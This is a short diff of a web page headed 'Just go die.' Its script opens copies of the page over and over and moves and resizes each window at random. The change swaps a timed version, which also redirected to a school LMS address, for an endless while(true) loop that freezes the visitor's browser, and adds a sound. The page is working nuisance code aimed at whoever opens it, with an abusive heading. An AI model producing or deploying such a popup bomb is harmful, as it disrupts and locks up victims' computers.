@@ -6,16 +6,12 @@
 <h1>Just go die.</h1>
 <script>
 var win;
-setTimeout(function(){
-setInterval(function(){
-win = window.open(location.href, "", "width = 200, height = 350");
+while(true){
+  win = window.open(location.href, "", "width = 200, height = 350");
 win.moveTo(Math.random() * 1982, Math.random() * 1080);
 win.resizeTo(Math.random() * 1982, Math.random() * 1080);
-}, 1000);
-}, 1000);
-setTimeout(function(){
-location.href = "https://lms.fcps.edu/" + Math.random();
-}, 10000);
+}
+  playSound("/tree.mp3")
 </script>
 </body>
 </html>
